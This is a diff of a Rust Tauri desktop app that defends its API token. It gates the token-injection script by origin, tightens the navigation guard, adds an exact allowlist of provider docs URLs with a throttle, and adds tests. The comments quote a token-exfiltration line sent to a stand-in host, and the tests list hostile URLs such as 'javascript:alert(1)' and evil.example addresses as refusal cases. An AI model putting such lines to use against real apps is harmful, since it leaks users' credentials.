@@ -44,9 +44,30 @@ fn stop_sidecar(process: SidecarProcess) {
     let _ = process.child.kill();
 }
 
-fn initialization_script(api: &str, token: &str) -> String {
+/// Origins the bundled app is served from (`http://tauri.localhost` on
+/// Windows, `tauri://localhost` elsewhere). Only these receive the token.
+const APP_ORIGINS: [&str; 2] = ["http://tauri.localhost", "tauri://localhost"];
+
+/// Defines `__OH_API__` / `__OH_TOKEN__` — but only when the document is the
+/// app itself. The script runs on every document the webview loads, so any
+/// other page (should one ever slip past the navigation guard) gets nothing.
+/// Origins that receive the token: the app, plus the dev server in dev builds.
+fn token_origins(dev_url: Option<&tauri::Url>) -> Vec<String> {
+    let mut origins: Vec<String> = APP_ORIGINS.iter().map(|o| o.to_string()).collect();
+    if let Some(dev) = dev_url {
+        origins.push(dev.origin().ascii_serialization());
+    }
+    origins
+}
+
+fn initialization_script<S: AsRef<str> + serde::Serialize>(
+    api: &str,
+    token: &str,
+    origins: &[S],
+) -> String {
     format!(
-        "Object.defineProperties(window, {{ __OH_API__: {{ value: {}, writable: false }}, __OH_TOKEN__: {{ value: {}, writable: false }} }});",
+        "if ({}.includes(window.location.origin)) {{ Object.defineProperties(window, {{ __OH_API__: {{ value: {}, writable: false }}, __OH_TOKEN__: {{ value: {}, writable: false }} }}); }}",
+        serde_json::to_string(origins).expect("origins serialize"),
         serde_json::to_string(api).expect("API URL serializes"),
         serde_json::to_string(token).expect("token serializes"),
     )
@@ -113,38 +134,58 @@ fn spawn_sidecar(app: &AppHandle, port: u16, token: &str) -> Result<(), String> 
 /// initialization script would hand `__OH_TOKEN__` to whatever page loads.
 fn is_app_navigation(url: &tauri::Url, dev_url: Option<&tauri::Url>) -> bool {
     match url.scheme() {
-        "tauri" => url.host_str() == Some("localhost"),
+        "tauri" => url.host_str() == Some("localhost") && url.port().is_none(),
         "about" => url.as_str() == "about:blank",
         // blob:http://tauri.localhost/<uuid> — judge the origin it was minted in.
         "blob" => url
             .path()
             .parse::<tauri::Url>()
             .is_ok_and(|inner| inner.scheme() != "blob" && is_app_navigation(&inner, dev_url)),
+        // wry serves the app only at http://tauri.localhost (no port); any other
+        // port or https goes to the network, where *.localhost is loopback.
         "http" | "https" => {
-            url.host_str() == Some("tauri.localhost")
+            (url.scheme() == "http"
+                && url.host_str() == Some("tauri.localhost")
+                && url.port().is_none())
                 || dev_url.is_some_and(|dev| dev.origin() == url.origin())
         }
         _ => false,
     }
 }
 
-/// External web pages (docs links) open in the system browser instead of the
-/// webview. Loopback hosts are excluded so a crafted link can't point the
-/// browser at the sidecar or other local services.
-fn opens_in_browser(url: &tauri::Url) -> bool {
-    matches!(url.scheme(), "http" | "https")
-        && !matches!(
-            url.host_str(),
-            None | Some("tauri.localhost" | "localhost" | "127.0.0.1" | "[::1]")
-        )
+/// The only pages the app hands to the system browser: the providers' docs
+/// links (`frontend/src/components/providers/catalog.ts`, pinned by a test).
+/// Opening arbitrary refused URLs would turn the guard into an exfiltration
+/// channel (`location = "https://x/?t=" + token`), so the match is exact.
+const DOCS_URLS: [&str; 5] = [
+    "https://docs.anthropic.com",
+    "https://cursor.com/docs/api",
+    "https://platform.openai.com/docs",
+    "https://docs.ollama.com",
+    "https://openrouter.ai/docs",
+];
+
+fn is_docs_link(url: &tauri::Url) -> bool {
+    DOCS_URLS
+        .iter()
+        .filter_map(|docs| docs.parse::<tauri::Url>().ok())
+        .any(|docs| &docs == url)
 }
 
-fn open_in_browser(app: &AppHandle, url: &tauri::Url) {
-    if opens_in_browser(url) {
-        // tauri-plugin-shell's open is deprecated in favour of tauri-plugin-opener;
-        // kept to avoid a new dependency for one call (backlog: migrate).
-        #[allow(deprecated)]
-        let _ = app.shell().open(url.as_str(), None);
+/// At most one browser open per second (a looping window.open can't spam tabs).
+#[derive(Default)]
+struct Throttle(Mutex<Option<Instant>>);
+
+impl Throttle {
+    fn allow(&self, now: Instant) -> bool {
+        let Ok(mut last) = self.0.lock() else {
+            return false;
+        };
+        if last.is_some_and(|t| now.saturating_duration_since(t) < Duration::from_secs(1)) {
+            return false;
+        }
+        *last = Some(now);
+        true
     }
 }
 
@@ -183,19 +224,22 @@ pub fn run() {
             } else {
                 None
             };
-            let nav_app = app.handle().clone();
             let popup_app = app.handle().clone();
+            let throttle = Throttle::default();
+            let origins = token_origins(dev_url.as_ref());
             WebviewWindowBuilder::from_config(app.handle(), &config)?
-                .initialization_script(initialization_script(&api, &token))
-                .on_navigation(move |url| {
-                    let allowed = is_app_navigation(url, dev_url.as_ref());
-                    if !allowed {
-                        open_in_browser(&nav_app, url);
-                    }
-                    allowed
-                })
+                .initialization_script(initialization_script(&api, &token, &origins))
+                // Navigation isn't governed by CSP. Refused URLs are dropped, never
+                // re-opened elsewhere. (tauri-runtime-wry allows URIs it can't parse
+                // without calling this; the origin-gated init script covers that.)
+                .on_navigation(move |url| is_app_navigation(url, dev_url.as_ref()))
                 .on_new_window(move |url, _features| {
-                    open_in_browser(&popup_app, &url);
+                    if is_docs_link(&url) && throttle.allow(Instant::now()) {
+                        // tauri-plugin-shell's open is deprecated in favour of
+                        // tauri-plugin-opener; kept to avoid a new dependency (backlog).
+                        #[allow(deprecated)]
+                        let _ = popup_app.shell().open(url.as_str(), None);
+                    }
                     tauri::webview::NewWindowResponse::Deny
                 })
                 .build()?;
@@ -216,7 +260,7 @@ mod tests {
 
     #[test]
     fn initialization_script_serializes_values_without_executable_injection() {
-        let script = initialization_script("http://127.0.0.1:8123", "tok\"en");
+        let script = initialization_script("http://127.0.0.1:8123", "tok\"en", &APP_ORIGINS);
         assert!(script.contains("http://127.0.0.1:8123"));
         assert!(script.contains("tok\\\"en"));
         assert!(script.contains("__OH_API__"));
@@ -285,6 +329,7 @@ mod tests {
             "frame-src 'none'",
             "frame-ancestors 'none'",
             "base-uri 'self'",
+            "form-action 'self'",
         ] {
             assert!(csp.contains(locked), "missing {locked}");
         }
@@ -340,6 +385,9 @@ mod tests {
             "blob:https://evil.example/x",
             "about:srcdoc",
             "javascript:alert(1)",
+            "http://tauri.localhost:8123/",
+            "https://tauri.localhost/",
+            "tauri://evil/",
         ] {
             assert!(!is_app_navigation(&url(bad), None), "{bad} must be refused");
         }
@@ -355,19 +403,81 @@ mod tests {
     }
 
     #[test]
-    fn only_external_web_links_are_handed_to_the_system_browser() {
-        assert!(opens_in_browser(&url("https://openrouter.ai/docs")));
-        assert!(opens_in_browser(&url("http://example.com/")));
-        for not_web in [
-            "http://tauri.localhost/x",
-            "file:///C:/x",
-            "javascript:alert(1)",
-            "ms-settings:privacy",
-            "http://127.0.0.1:8000/",
-            "http://localhost:9000/",
-        ] {
-            assert!(!opens_in_browser(&url(not_web)), "{not_web}");
+    fn the_token_is_only_defined_for_the_app_origin() {
+        // Defence in depth (SEC re-review of #43, F1b/F3): any other page that
+        // ends up in the webview must not receive __OH_TOKEN__.
+        let script = initialization_script("http://127.0.0.1:1", "t", &APP_ORIGINS);
+        let guard = script.split("Object.defineProperties").next().unwrap();
+        // Exactly `if (<origins>.includes(window.location.origin)) {` — nothing
+        // that could short-circuit the check.
+        let origins_json = serde_json::to_string(&APP_ORIGINS).unwrap();
+        assert_eq!(
+            guard,
+            format!("if ({origins_json}.includes(window.location.origin)) {{ ")
+        );
+        for origin in APP_ORIGINS {
+            assert!(guard.contains(&format!("\"{origin}\"")), "{origin} missing");
         }
+        assert!(
+            !guard.contains("127.0.0.1"),
+            "the sidecar is not an app origin"
+        );
+    }
+
+    #[test]
+    fn dev_builds_also_hand_the_token_to_the_dev_server_only() {
+        assert_eq!(token_origins(None), APP_ORIGINS.map(String::from).to_vec());
+        let dev = url("http://127.0.0.1:3000/");
+        let with_dev = token_origins(Some(&dev));
+        assert!(with_dev.contains(&"http://127.0.0.1:3000".to_string()));
+        assert_eq!(with_dev.len(), APP_ORIGINS.len() + 1);
+    }
+
+    #[test]
+    fn only_catalog_docs_pages_open_in_the_system_browser() {
+        // SEC re-review of #43, F1: opening any refused URL in the browser was
+        // an exfil channel (location = "https://x/?t=" + token). Exact allowlist.
+        for docs in DOCS_URLS {
+            assert!(is_docs_link(&url(docs)), "{docs}");
+        }
+        for not_docs in [
+            "https://openrouter.ai/docs?t=secret",
+            "https://openrouter.ai/docs/../keys",
+            "https://openrouter.ai/",
+            "https://evil.example/docs",
+            "http://openrouter.ai/docs",
+            "https://openrouter.ai.evil.example/docs",
+            "http://127.0.0.1:8000/",
+            "file:///C:/x",
+        ] {
+            assert!(!is_docs_link(&url(not_docs)), "{not_docs}");
+        }
+    }
+
+    #[test]
+    fn docs_allowlist_matches_the_provider_catalog() {
+        // Every docs link the UI renders must be openable, and nothing else.
+        let catalog = include_str!("../../frontend/src/components/providers/catalog.ts");
+        let mut in_catalog: Vec<String> = catalog
+            .lines()
+            .filter_map(|l| l.trim().strip_prefix("docs: \""))
+            .filter_map(|rest| rest.split('"').next())
+            .map(|u| url(u).to_string())
+            .collect();
+        in_catalog.sort();
+        let mut allowed: Vec<String> = DOCS_URLS.iter().map(|u| url(u).to_string()).collect();
+        allowed.sort();
+        assert!(!in_catalog.is_empty());
+        assert_eq!(allowed, in_catalog);
+    }
+
+    #[test]
+    fn browser_opens_are_throttled() {
+        let throttle = Throttle::default();
+        let t0 = std::time::Instant::now();
+        assert!(throttle.allow(t0));
+        assert!(!throttle.allow(t0 + std::time::Duration::from_millis(300)));
+        assert!(throttle.allow(t0 + std::time::Duration::from_millis(1200)));
     }
 
     #[test]
